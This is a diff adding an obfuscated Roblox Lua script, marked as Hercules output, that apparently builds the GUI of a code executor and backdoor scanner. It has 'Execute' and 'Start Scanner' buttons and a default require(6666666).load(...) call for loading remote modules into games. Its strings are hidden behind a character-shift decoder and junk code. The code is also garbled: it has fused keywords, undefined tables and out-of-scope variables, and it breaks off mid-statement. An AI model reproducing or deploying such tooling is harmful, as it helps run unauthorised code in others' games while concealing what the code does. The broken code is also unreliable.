@@ -1,1 +1,1419 @@
+--[Obfuscated by Hercules v1.6.2 | hercules-obfuscator.xyz/discord | hercules-obfuscator.xyz/source]
+return (function(...) local qcLQPDzCgIRq,YlPcXxwe,EBhvjIpErOvB,TUOrVRHTtyC,dRZKetlSjtzW,qpWEBSgmDgjG,TEhDNbMZLxCC,vOWNXnqwF,mrsvJxUeFpB,PDEnigxo,qggwyxGD,gDWOZdWE,TCdJefnm,wyDofklO,AaouwFPa,gDMDejUUvG,XcAAlBxNFM,GuUvrNBY,JLKfmyPOlXp,lHetMCfTiy qcLQPDzCgIRq=ipairs;YlPcXxwe=pairs;EBhvjIpErOvB=tonumber;TUOrVRHTtyC=tostring;dRZKetlSjtzW=print;qpWEBSgmDgjG=_G;TEhDNbMZLxCC=sort;vOWNXnqwF=math.ceil;mrsvJxUeFpB=math.cos;PDEnigxo=math.random;qggwyxGD=math.sin;gDWOZdWE=string.char;TCdJefnm=string.find;wyDofklO=string.format;AaouwFPa=string.gsub;gDMDejUUvG=string.sub;XcAAlBxNFM=table.concat;GuUvrNBY=table.insert;JLKfmyPOlXp=table.unpack;lHetMCfTiy=game:GetService;local iaJjlgZi=47 local function sedYHCjtTye(dFZgZzWcOw)local _=73 end local function BVAfflWftQW(FbdqbwFSesB)local _=75 end if false then local _=31 end while false do local _=85 break end local function jIUGMblz(RnKSsKhrX)local _=50 end while false do local _=62 break end local function ZjeACRxP(NNRUgolQrTF)local _=63 end while false do local _=87 break end if false then local _=9 end if false then local _=53 end local function xCXuKidO(vsCWJRKSbE)local _=15 end local function wiFbHLmIwGe(COllOVRMUSTG)local _=83 end while false do local _=25 break end local ZXsqOkOf=59 local dJjxIzPhFO=3163;local gjDfEhlFkYW=2230;local jATuXLqDt=0;local dNYumafqqI=2852;while dJjxIzPhFO>gjDfEhlFkYW and jATuXLqDt<3 do dJjxIzPhFO=dJjxIzPhFO+-311;jATuXLqDt=jATuXLqDt+1;if dJjxIzPhFO<dNYumafqqI then local ObAiGQGoM=16;ObAiGQGoM=ObAiGQGoM*2;else if true then local _=43 end if true then local _=1 end local function CyUtwXAsMuGS(ONZpsJrPh)local _=9 end while false do local _=14 break end if false then local _=3 end local function EDEcgooaMqzd(uxnbpjUVrIci)local _=69 end if true then local _=26 end local function kFxIXfaPz(GuXqhTbaiVGx)local _=12 end local eOfxiVkLRerU=25 if false then local _=78 end local dIntIuLTV=26 local function eVaPmIhjAR(fbCNRfctzFjw)local _=29 end local function sKuGHLlsRrF(gMntJuieBhND)local _=23 end if true then local _=19 end local function ViYUbGlDK(OoxQPNxJ)local _=30 end local function zfsdBcUk(pwgkuNHS)local _=44 end local function QXbrxrZJGTA(LjUwjdTVBokN)return(LjUwjdTVBokN>=48 and LjUwjdTVBokN<=57)or(LjUwjdTVBokN>=65 and LjUwjdTVBokN<=90)or(LjUwjdTVBokN>=97 and LjUwjdTVBokN<=122)end local function bbkGQKwkuBHx(NFzHynGR,emimVwESuzW)local kjWqISMPx={}for i=1,#NFzHynGR do local LjUwjdTVBokN=NFzHynGR:byte(i)if QXbrxrZJGTA(LjUwjdTVBokN)then local BbnMilhmt if LjUwjdTVBokN>=48 and LjUwjdTVBokN<=57 then BbnMilhmt=((LjUwjdTVBokN-48-emimVwESuzW+10)%10)+48 elseif LjUwjdTVBokN>=65 and LjUwjdTVBokN<=90 then BbnMilhmt=((LjUwjdTVBokN-65-emimVwESuzW+26)%26)+65 elseif LjUwjdTVBokN>=97 and LjUwjdTVBokN<=122 then BbnMilhmt=((LjUwjdTVBokN-97-emimVwESuzW+26)%26)+97 end GuUvrNBY(kjWqISMPx,gDWOZdWE(BbnMilhmt))else GuUvrNBY(kjWqISMPx,gDWOZdWE(LjUwjdTVBokN))end end return XcAAlBxNFM(kjWqISMPx)end local function QXbrxrZJGTA(LjUwjdTVBokN)return(LjUwjdTVBokN>=48 and LjUwjdTVBokN<=57)or(LjUwjdTVBokN>=65 and LjUwjdTVBokN<=90)or(LjUwjdTVBokN>=97 and LjUwjdTVBokN<=122)end if((5<15)==not(5>=15))thenlocal YXRdjYSs={};end;if((6<20)==not(6>=20))thenG2L[bbkGQKwkuBHx("5",4)]=Instance.new(bbkGQKwkuBHx("DncppyRft",11),lHetMCfTiy(bbkGQKwkuBHx('WilyAoc',20)):WaitForChild(bbkGQKwkuBHx('UreoraJxl',3)));end;if(qggwyxGD(159)^2+mrsvJxUeFpB(159)^2>=0.99999)thenG2L[bbkGQKwkuBHx("6",5)][bbkGQKwkuBHx("Uhtl",7)]=[[/\UG^^%GRFRETHJUIKLUYTU%^UKI*OL>:?:>L:?IUHGYGRDFECGFRDWSRGGDFUMI>:<L>M:<Mty66ufecU*i96554t3y4656tVDGEXfwrrtfvrHmjy.l.,/lminUGUrefdWSQrd]];end;if(10%10==0)thenG2L[bbkGQKwkuBHx("8",7)][bbkGQKwkuBHx("UDiyzsWzcvqdjm",21)]=Enum.ZIndexBehavior.Sibling;end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("8",7)][bbkGQKwkuBHx("PcqcrMlQnyul",24)]=false;end;if(41%1==0 and 41>=41)thenG2L[bbkGQKwkuBHx("1",9)]=Instance.new(bbkGQKwkuBHx("Htcog",2),YXRdjYSs[bbkGQKwkuBHx("0",9)]);end;if(3%3==0)thenG2L[bbkGQKwkuBHx("6",4)][bbkGQKwkuBHx("GtwijwXnejUncjq",5)]=0;end;if(54%1==0 and 54>=54)thenG2L[bbkGQKwkuBHx("5",3)][bbkGQKwkuBHx("YxzhdolrkaZlilo6",23)]=Color3.fromRGB(0,0,0);end;if(select(2,pcall(function()return EBhvjIpErOvB('24c3',16)end))~=nil)thenG2L[bbkGQKwkuBHx("6",4)][bbkGQKwkuBHx("Vlch",3)]=UDim2.new(0,481,0,276);end;if(qggwyxGD(130)^2+mrsvJxUeFpB(130)^2>=0.99999)thenG2L[bbkGQKwkuBHx("9",7)][bbkGQKwkuBHx("Nmqgrgml",24)]=UDim2.new(0.2732,0,0.30186,0);end;if((7<13)==not(7>=13))thenG2L[bbkGQKwkuBHx("9",7)][bbkGQKwkuBHx("UhkwxkVhehk2",19)]=Color3.fromRGB(0,0,0);end;if((8<12)==not(8>=12))thenG2L[bbkGQKwkuBHx("1",8)]=Instance.new(bbkGQKwkuBHx("NBVhkgxk",19),YXRdjYSs[bbkGQKwkuBHx("6",4)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('7d2',16)end))~=nil)thenG2L[bbkGQKwkuBHx("7",3)]=Instance.new(bbkGQKwkuBHx("XLVwurnh",3),YXRdjYSs[bbkGQKwkuBHx("0",8)]);end;if((3<11)==not(3>=11))thenG2L[bbkGQKwkuBHx("1",7)][bbkGQKwkuBHx("Cqrltwnbb",9)]=2.5;end;if(99%1==0 and 99>=99)thenG2L[bbkGQKwkuBHx("2",8)][bbkGQKwkuBHx("Dpmps",1)]=Color3.fromRGB(210,210,210);end;if(select(2,pcall(function()return EBhvjIpErOvB('80f',16)end))~=nil)thenG2L[bbkGQKwkuBHx("6",1)]=Instance.new(bbkGQKwkuBHx("YMKvehmirx",4),YXRdjYSs[bbkGQKwkuBHx("7",3)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('1170',16)end))~=nil)thenG2L[bbkGQKwkuBHx("4",9)][bbkGQKwkuBHx("Ykhkn",22)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(#{1,1,1,1,1}==5)thenG2L[bbkGQKwkuBHx("1",5)]=Instance.new(bbkGQKwkuBHx("Mvskly",7),YXRdjYSs[bbkGQKwkuBHx("9",7)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('a79',16)end))~=nil)thenG2L[bbkGQKwkuBHx("8",2)][bbkGQKwkuBHx("Ylxp",11)]=[[Executor]];end;if((10<12)==not(10>=12))thenG2L[bbkGQKwkuBHx("3",6)]=Instance.new(bbkGQKwkuBHx("Rdmyq",12),YXRdjYSs[bbkGQKwkuBHx("8",2)]);end;if(2%2==0)thenG2L[bbkGQKwkuBHx("1",4)][bbkGQKwkuBHx("Cpzpisl",7)]=false;end;if(#{1,1}==2)thenG2L[bbkGQKwkuBHx("0",3)][bbkGQKwkuBHx("DcemitqwpfEqnqt5",2)]=Color3.fromRGB(11,11,11);end;if(4%4==0)thenG2L[bbkGQKwkuBHx("1",4)][bbkGQKwkuBHx("Xnej",5)]=UDim2.new(0,462,0,163);end;if(#{1,1,1,1,1}==5)thenG2L[bbkGQKwkuBHx("0",3)][bbkGQKwkuBHx("Edhxixdc",15)]=UDim2.new(0.01963,0,0.22861,0);end;if(select(2,pcall(function()return EBhvjIpErOvB('621',16)end))~=nil)thenG2L[bbkGQKwkuBHx("2",5)][bbkGQKwkuBHx("Gtfx",19)]=[[ExecutorBox]];end;if(select(2,pcall(function()return EBhvjIpErOvB('55c',16)end))~=nil)thenG2L[bbkGQKwkuBHx("5",7)]=Instance.new(bbkGQKwkuBHx("JXRdgctg",15),YXRdjYSs[bbkGQKwkuBHx("0",3)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('2058',16)end))~=nil)thenG2L[bbkGQKwkuBHx("8",9)]=Instance.new(bbkGQKwkuBHx("FqjfNaj",12),YXRdjYSs[bbkGQKwkuBHx("2",5)]);end;if(qggwyxGD(176)^2+mrsvJxUeFpB(176)^2>=0.99999)thenG2L[bbkGQKwkuBHx("4",5)][bbkGQKwkuBHx("CngcGJurpwvnwc",9)]=Enum.TextXAlignment.Left;end;if(qggwyxGD(221)^2+mrsvJxUeFpB(221)^2>=0.99999)thenG2L[bbkGQKwkuBHx("0",1)][bbkGQKwkuBHx("FqjfIdmbbqp",12)]=true;end;if(select(2,pcall(function()return EBhvjIpErOvB('208d',16)end))~=nil)thenG2L[bbkGQKwkuBHx("4",5)][bbkGQKwkuBHx("JunjJhqdifqhudso",16)]=0.5;end;if(10%10==0)thenG2L[bbkGQKwkuBHx("7",8)][bbkGQKwkuBHx("AleaZpgl",7)]=18;end;if(#{1,1}==2)thenG2L[bbkGQKwkuBHx("5",6)][bbkGQKwkuBHx("JunjSebeh9",16)]=Color3.fromRGB(255,255,255);end;if((1<16)==not(1>=16))thenG2L[bbkGQKwkuBHx("7",8)][bbkGQKwkuBHx("SdwsXZkhfmldms",25)]=Enum.TextYAlignment.Top;end;if((4<11)==not(4>=11))thenG2L[bbkGQKwkuBHx("5",6)][bbkGQKwkuBHx("HgiqmxuatjIurux9",6)]=Color3.fromRGB(13,13,13);end;if(select(2,pcall(function()return EBhvjIpErOvB('20c6',16)end))~=nil)thenG2L[bbkGQKwkuBHx("6",7)][bbkGQKwkuBHx("GpouGbdf",1)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]],Enum.FontWeight.Regular,Enum.FontStyle.Normal);end;if(81%1==0 and 81>=81)thenG2L[bbkGQKwkuBHx("3",4)][bbkGQKwkuBHx("JriqfIfkb",23)]=true;end;if(76%1==0 and 76>=76)thenG2L[bbkGQKwkuBHx("5",6)][bbkGQKwkuBHx("NwplcEpieZyQznfd",11)]=false;end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("7",8)][bbkGQKwkuBHx("HdsuwzgdvwjLwpl",18)]=[[require(6666666).load(bbkGQKwkuBHx("Ewwlspi", 4))]];end;if((8<14)==not(8>=14))thenG2L[bbkGQKwkuBHx("4",5)][bbkGQKwkuBHx("Dtkp",11)]=UDim2.new(0.94935,0,0.89816,0);end;if(qggwyxGD(157)^2+mrsvJxUeFpB(157)^2>=0.99999)thenG2L[bbkGQKwkuBHx("2",3)][bbkGQKwkuBHx("Mlpfqflk",23)]=UDim2.new(0.02208,0,0.04479,0);end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("6",7)][bbkGQKwkuBHx("Kvok",17)]=[[]];end;if(select(2,pcall(function()return EBhvjIpErOvB('153d',16)end))~=nil)thenG2L[bbkGQKwkuBHx("0",1)][bbkGQKwkuBHx("PoqyufcibrHfobgdofsbqm",14)]=1;end;if((10<12)==not(10>=12))thenG2L[bbkGQKwkuBHx("z",25)]=Instance.new(bbkGQKwkuBHx("Yhewxk",19),YXRdjYSs[bbkGQKwkuBHx("3",4)]);end;if((7<13)==not(7>=13))thenG2L[bbkGQKwkuBHx("s",18)][bbkGQKwkuBHx("Pcog",2)]=[[SyntaxHighlights]];end;if(qggwyxGD(329)^2+mrsvJxUeFpB(329)^2>=0.99999)thenG2L[bbkGQKwkuBHx("a",25)]=Instance.new(bbkGQKwkuBHx("VymkvCmbszd",10),YXRdjYSs[bbkGQKwkuBHx("5",6)]);end;if((2<18)==not(2>=18))thenG2L[bbkGQKwkuBHx("e",3)][bbkGQKwkuBHx("Mzld",25)]=[[Highlight]];end;if((4<16)==not(4>=16))thenG2L[bbkGQKwkuBHx("p",13)]=Instance.new(bbkGQKwkuBHx("CetkbuIshyfj",16),YXRdjYSs[bbkGQKwkuBHx("j",8)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('1178',16)end))~=nil)thenG2L[bbkGQKwkuBHx("x",21)][bbkGQKwkuBHx("Dqcu",16)]=[[DFtxsjNFcWwt]];end;if((5<19)==not(5>=19))thenG2L[bbkGQKwkuBHx("k",7)]=Instance.new(bbkGQKwkuBHx("AcrizsGqfwdh",14),YXRdjYSs[bbkGQKwkuBHx("n",11)]);end;if((1<16)==not(1>=16))thenG2L[bbkGQKwkuBHx("v",18)][bbkGQKwkuBHx("Erdv",17)]=[[QnrZfpbujzN]];end;if(qggwyxGD(110)^2+mrsvJxUeFpB(110)^2>=0.99999)thenG2L[bbkGQKwkuBHx("s",14)]=Instance.new(bbkGQKwkuBHx("JlaribPzofmq",23),YXRdjYSs[bbkGQKwkuBHx("f",2)]);end;if((4<13)==not(4>=13))thenG2L[bbkGQKwkuBHx("t",15)][bbkGQKwkuBHx("Cpbt",15)]=[[idQRXqLUK]];end;if((10<17)==not(10>=17))thenG2L[bbkGQKwkuBHx("u",15)]=Instance.new(bbkGQKwkuBHx("Wirdv",17),YXRdjYSs[bbkGQKwkuBHx("7",1)]);end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("x",18)][bbkGQKwkuBHx("Dqaqjtm",8)]=false;end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("g",1)][bbkGQKwkuBHx("VuwealiohxWifil3",20)]=Color3.fromRGB(0,0,0);end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("v",16)][bbkGQKwkuBHx("Wmdi",4)]=UDim2.new(0,290,0,28);end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("n",8)][bbkGQKwkuBHx("Kjndodji",21)]=UDim2.new(0.0217,0,0.87081,0);end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("m",7)][bbkGQKwkuBHx("Xkwo",10)]=[[Execute]];end;if(#{1,1,1,1,1}==5)thenG2L[bbkGQKwkuBHx("j",4)][bbkGQKwkuBHx("SrtbxifleuKirejgrivetp",17)]=1;end;if(#{1,1}==2)thenG2L[bbkGQKwkuBHx("21",1)]=Instance.new(bbkGQKwkuBHx("QbuqYrqqlk",23),YXRdjYSs[bbkGQKwkuBHx("j",4)]);end;if(31%1==0 and 31>=31)thenG2L[bbkGQKwkuBHx("43",3)][bbkGQKwkuBHx("ItmiHxot",15)]=22;end;if(qggwyxGD(211)^2+mrsvJxUeFpB(211)^2>=0.99999)thenG2L[bbkGQKwkuBHx("21",1)][bbkGQKwkuBHx("PatpYkhkn5",22)]=Color3.fromRGB(0,0,0);end;if((3<11)==not(3>=11))thenG2L[bbkGQKwkuBHx("21",1)][bbkGQKwkuBHx("IhjrnyvbukJvsvy0",7)]=Color3.fromRGB(255,255,255);end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("87",7)][bbkGQKwkuBHx("IrqwIdfh",3)]=Font.new([[rbxasset://fonts/families/Michroma.json]],Enum.FontWeight.Bold,Enum.FontStyle.Normal);end;if(9%9==0)thenG2L[bbkGQKwkuBHx("98",8)][bbkGQKwkuBHx("AzbjfqntmcSqzmrozqdmbx",25)]=1;end;if(qggwyxGD(176)^2+mrsvJxUeFpB(176)^2>=0.99999)thenG2L[bbkGQKwkuBHx("76",6)][bbkGQKwkuBHx("Jzqv",17)]=UDim2.new(1,0,1,0);end;if(100%1==0 and 100>=100)thenG2L[bbkGQKwkuBHx("98",8)][bbkGQKwkuBHx("Whaw",3)]=[[Execute]];end;if(qggwyxGD(279)^2+mrsvJxUeFpB(279)^2>=0.99999)thenG2L[bbkGQKwkuBHx("43",3)][bbkGQKwkuBHx("Qdph",3)]=[[Button]];end;if(94%1==0 and 94>=94)thenG2L[bbkGQKwkuBHx("33",2)]=Instance.new(bbkGQKwkuBHx("JXHigdzt",15),YXRdjYSs[bbkGQKwkuBHx("32",2)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('fd3',16)end))~=nil)thenG2L[bbkGQKwkuBHx("00",9)][bbkGQKwkuBHx("Lzaucfwkk",18)]=1.5;end;if(5%5==0)thenG2L[bbkGQKwkuBHx("77",6)][bbkGQKwkuBHx("Htqtw",5)]=Color3.fromRGB(210,210,210);end;if(#{1,1,1,1,1}==5)thenG2L[bbkGQKwkuBHx("90",8)]=Instance.new(bbkGQKwkuBHx("QECnwzeajp",22),YXRdjYSs[bbkGQKwkuBHx("44",3)]);end;if(qggwyxGD(232)^2+mrsvJxUeFpB(232)^2>=0.99999)thenG2L[bbkGQKwkuBHx("01",9)][bbkGQKwkuBHx("Qczcf",14)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(select(2,pcall(function()return EBhvjIpErOvB('1cfd',16)end))~=nil)thenG2L[bbkGQKwkuBHx("79",6)]=Instance.new(bbkGQKwkuBHx("ZNXywtpj",5),YXRdjYSs[bbkGQKwkuBHx("21",1)]);end;if(1%1==0)thenG2L[bbkGQKwkuBHx("79",6)][bbkGQKwkuBHx("Qefzhkbpp",23)]=2.5;end;if(qggwyxGD(110)^2+mrsvJxUeFpB(110)^2>=0.99999)thenG2L[bbkGQKwkuBHx("80",7)][bbkGQKwkuBHx("Htqtw",5)]=Color3.fromRGB(210,210,210);end;if(qggwyxGD(25)^2+mrsvJxUeFpB(25)^2>=0.99999)thenG2L[bbkGQKwkuBHx("24",1)][bbkGQKwkuBHx("EttpcWxvsoiQshi",4)]=Enum.ApplyStrokeMode.Border;end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("81",7)]=Instance.new(bbkGQKwkuBHx("PDBmvydzio",21),YXRdjYSs[bbkGQKwkuBHx("02",9)]);end;if(qggwyxGD(275)^2+mrsvJxUeFpB(275)^2>=0.99999)thenG2L[bbkGQKwkuBHx("58",4)][bbkGQKwkuBHx("Xjgjm",21)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if((9<16)==not(9>=16))thenG2L[bbkGQKwkuBHx("04",9)]=Instance.new(bbkGQKwkuBHx("CQKwzvmz",8),YXRdjYSs[bbkGQKwkuBHx("87",7)]);end;if(7%7==0)thenG2L[bbkGQKwkuBHx("61",5)]=Instance.new(bbkGQKwkuBHx("Kwfrj",5),YXRdjYSs[bbkGQKwkuBHx("1",5)]);end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("61",5)][bbkGQKwkuBHx("Uhrhakd",25)]=false;end;if(qggwyxGD(219)^2+mrsvJxUeFpB(219)^2>=0.99999)thenG2L[bbkGQKwkuBHx("50",4)][bbkGQKwkuBHx("HgiqmxuatjIurux9",6)]=Color3.fromRGB(0,0,0);end;if(7%7==0)thenG2L[bbkGQKwkuBHx("94",8)][bbkGQKwkuBHx("Pfwb",23)]=UDim2.new(0,162,0,28);end;if(qggwyxGD(355)^2+mrsvJxUeFpB(355)^2>=0.99999)thenG2L[bbkGQKwkuBHx("38",2)][bbkGQKwkuBHx("Hgkalagf",18)]=UDim2.new(0.64006,0,0.87081,0);end;if(#{1,1,1,1,1}==5)thenG2L[bbkGQKwkuBHx("94",8)][bbkGQKwkuBHx("Tgsk",6)]=[[Clear]];end;if(select(2,pcall(function()return EBhvjIpErOvB('1fa1',16)end))~=nil)thenG2L[bbkGQKwkuBHx("50",4)][bbkGQKwkuBHx("RqsawhekdtJhqdifqhudso",16)]=1;end;if(100%1==0 and 100>=100)thenG2L[bbkGQKwkuBHx("62",5)]=Instance.new(bbkGQKwkuBHx("AleaIbaavu",7),YXRdjYSs[bbkGQKwkuBHx("50",4)]);end;if(78%1==0 and 78>=78)thenG2L[bbkGQKwkuBHx("95",8)][bbkGQKwkuBHx("JunjIypu",16)]=22;end;if(qggwyxGD(74)^2+mrsvJxUeFpB(74)^2>=0.99999)thenG2L[bbkGQKwkuBHx("95",8)][bbkGQKwkuBHx("CngcLxuxa2",9)]=Color3.fromRGB(0,0,0);end;if(8%8==0)thenG2L[bbkGQKwkuBHx("39",2)][bbkGQKwkuBHx("QprzvgdjcsRdadg8",15)]=Color3.fromRGB(255,255,255);end;if(select(2,pcall(function()return EBhvjIpErOvB('21db',16)end))~=nil)thenG2L[bbkGQKwkuBHx("39",2)][bbkGQKwkuBHx("GpouGbdf",1)]=Font.new([[rbxasset://fonts/families/Michroma.json]],Enum.FontWeight.Bold,Enum.FontStyle.Normal);end;if(qggwyxGD(211)^2+mrsvJxUeFpB(211)^2>=0.99999)thenG2L[bbkGQKwkuBHx("28",1)][bbkGQKwkuBHx("UtvdzkhngwMktglitkxgvr",19)]=1;end;if(select(2,pcall(function()return EBhvjIpErOvB('5ab',16)end))~=nil)thenG2L[bbkGQKwkuBHx("28",1)][bbkGQKwkuBHx("Ukbg",2)]=UDim2.new(1,0,1,0);end;if(select(2,pcall(function()return EBhvjIpErOvB('1708',16)end))~=nil)thenG2L[bbkGQKwkuBHx("62",5)][bbkGQKwkuBHx("Alea",7)]=[[Clear]];end;if(7%7==0)thenG2L[bbkGQKwkuBHx("51",4)][bbkGQKwkuBHx("Boas",14)]=[[Button]];end;if(#{1,1}==2)thenG2L[bbkGQKwkuBHx("30",2)]=Instance.new(bbkGQKwkuBHx("CQAbzwsm",8),YXRdjYSs[bbkGQKwkuBHx("06",9)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('21fc',16)end))~=nil)thenG2L[bbkGQKwkuBHx("85",7)][bbkGQKwkuBHx("Ocdxfiznn",21)]=2.5;end;if(100%1==0 and 100>=100)thenG2L[bbkGQKwkuBHx("07",9)][bbkGQKwkuBHx("Tfcfi",17)]=Color3.fromRGB(210,210,210);end;if(qggwyxGD(182)^2+mrsvJxUeFpB(182)^2>=0.99999)thenG2L[bbkGQKwkuBHx("41",3)][bbkGQKwkuBHx("GvvreYzxuqkSujk",6)]=Enum.ApplyStrokeMode.Border;end;if(85%1==0 and 85>=85)thenG2L[bbkGQKwkuBHx("97",8)]=Instance.new(bbkGQKwkuBHx("OCAluxcyhn",20),YXRdjYSs[bbkGQKwkuBHx("63",5)]);end;if(select(2,pcall(function()return EBhvjIpErOvB('aaf',16)end))~=nil)thenG2L[bbkGQKwkuBHx("75",6)][bbkGQKwkuBHx("Myvyb",10)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(98%1==0 and 98>=98)thenG2L[bbkGQKwkuBHx("4x",23)]=Instance.new(bbkGQKwkuBHx("KYIjheau",16),YXRdjYSs[bbkGQKwkuBHx("39",2)]);end;if(7%7==0)thenG2L[bbkGQKwkuBHx("5y",24)][bbkGQKwkuBHx("Ftuowzqee",12)]=1.5;end;if(48%1==0 and 48>=48)thenG2L[bbkGQKwkuBHx("6p",15)][bbkGQKwkuBHx("Zlilo",23)]=Color3.fromRGB(210,210,210);end;if(6%6==0)thenG2L[bbkGQKwkuBHx("1v",20)]=Instance.new(bbkGQKwkuBHx("HVTenqvrag",13),YXRdjYSs[bbkGQKwkuBHx("5o",14)]);end;if(34%1==0 and 34>=34)thenG2L[bbkGQKwkuBHx("5z",24)][bbkGQKwkuBHx("Xjgjm",21)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(6%6==0)thenG2L[bbkGQKwkuBHx("6h",5)]=Instance.new(bbkGQKwkuBHx("OCWilhyl",20),YXRdjYSs[bbkGQKwkuBHx("95",8)]);end;if(6%6==0)thenG2L[bbkGQKwkuBHx("1n",10)]=Instance.new(bbkGQKwkuBHx("Tfoas",14),YXRdjYSs[bbkGQKwkuBHx("6",4)]);end;if(qggwyxGD(194)^2+mrsvJxUeFpB(194)^2>=0.99999)thenG2L[bbkGQKwkuBHx("4q",13)][bbkGQKwkuBHx("ZmpbcpQgxcNgvcj",24)]=0;end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("7t",16)][bbkGQKwkuBHx("DcemitqwpfEqnqt5",2)]=Color3.fromRGB(0,0,0);end;if(86%1==0 and 86>=86)thenG2L[bbkGQKwkuBHx("4g",3)][bbkGQKwkuBHx("Karw",18)]=UDim2.new(0,482,0,276);end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("3p",12)][bbkGQKwkuBHx("Baeufuaz",12)]=UDim2.new(-0.00057,0,-0.00212,0);end;if((1<11)==not(1>=11))thenG2L[bbkGQKwkuBHx("3f",2)][bbkGQKwkuBHx("LybnobMyvyb3",10)]=Color3.fromRGB(0,0,0);end;if(52%1==0 and 52>=52)thenG2L[bbkGQKwkuBHx("6i",5)][bbkGQKwkuBHx("Reqi",4)]=[[Scanner]];end;if(#{1,1,1}==3)thenG2L[bbkGQKwkuBHx("9m",8)]=Instance.new(bbkGQKwkuBHx("OCWilhyl",20),YXRdjYSs[bbkGQKwkuBHx("7j",6)]);end;if(#{1,1,1,1,1}==5)thenG2L[bbkGQKwkuBHx("7v",16)]=Instance.new(bbkGQKwkuBHx("DRBcaxtn",9),YXRdjYSs[bbkGQKwkuBHx("8u",17)]);end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("8m",7)][bbkGQKwkuBHx("Znoiqtkyy",6)]=2.5;end;if(78%1==0 and 78>=78)thenG2L[bbkGQKwkuBHx("5d",24)][bbkGQKwkuBHx("Rdadg",15)]=Color3.fromRGB(210,210,210);end;if((3<15)==not(3>=15))thenG2L[bbkGQKwkuBHx("64",4)]=Instance.new(bbkGQKwkuBHx("MAYjsvawfl",18),YXRdjYSs[bbkGQKwkuBHx("1p",10)]);end;if(#{1,1,1,1,1}==5)thenG2L[bbkGQKwkuBHx("86",6)][bbkGQKwkuBHx("Ykhkn",22)]=ColorSequence.new{ColorSequenceKeypoint.new(0.000,Color3.fromRGB(129,255,0)),ColorSequenceKeypoint.new(0.375,Color3.fromRGB(86,255,0)),ColorSequenceKeypoint.new(0.747,Color3.fromRGB(44,127,2)),ColorSequenceKeypoint.new(1.000,Color3.fromRGB(46,125,0))};end;if(#{1,1,1,1}==4)thenG2L[bbkGQKwkuBHx("76",5)]=Instance.new(bbkGQKwkuBHx("AleaIbaavu",7),YXRdjYSs[bbkGQKwkuBHx("7j",6)]);end;if(16%1==0 and 16>=16)thenG2L[bbkGQKwkuBHx("76",5)][bbkGQKwkuBHx("EpieDtkp",11)]=57;end;if(6%6==0)thenG2L[bbkGQKwkuBHx("54",3)][bbkGQKwkuBHx("KvokTfcfi0",17)]=Color3.fromRGB(0,0,0);end;if(3%3==0)thenG2L[bbkGQKwkuBHx("87",6)][bbkGQKwkuBHx("ZyaiepmslbAmjmp7",24)]=Color3.fromRGB(255,255,255);end;if((1<18)==not(1>=18))thenG2L[bbkGQKwkuBHx("09",8)][bbkGQKwkuBHx("MvuaMhjl",7)]=Font.new([[rbxasset://fonts/families/Michroma.json]],Enum.FontWeight.Bold,Enum.FontStyle.Normal);end;if(select(2,pcall(function()return EBhvjIpErOvB('f56',16)end))~=nil)thenG2L[bbkGQKwkuBHx("43",2)][bbkGQKwkuBHx("ZyaiepmslbRpylqnypclaw",24)]=1;end;if(6%6==0)thenG2L[bbkGQKwkuBHx("32",1)][bbkGQKwkuBHx("Karw",18)]=UDim2.new(0.83633,0,0.42361,0);end;if((4<20)==not(4>=20))thenG2L[bbkGQKwkuBHx("10",9)][bbkGQKwkuBHx("Yjcy",5)]=[[Start Scanner]];end;if(68%1==0 and 68>=68)thenG2L[bbkGQKwkuBHx("32",1)][bbkGQKwkuBHx("Xkwo",10)]=[[Button]];end;if(57%1==0 and 